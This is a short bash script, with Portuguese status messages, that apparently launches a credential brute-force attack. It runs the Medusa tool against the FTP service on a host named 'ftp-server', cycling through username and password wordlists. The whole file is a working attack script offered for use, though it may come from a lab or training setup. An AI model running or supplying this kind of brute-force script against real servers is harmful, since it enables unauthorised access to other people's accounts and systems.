#!/bin/bash

echo "Iniciando o ataque com medusa..."

SERVER="ftp-server"
USERNAMES_LIST="wordlists/usernames.txt"
PWDS_LIST="wordlists/passwords.txt"

medusa -h $SERVER -U $USERNAMES_LIST -P $PWDS_LIST -M ftp


echo "Feito!"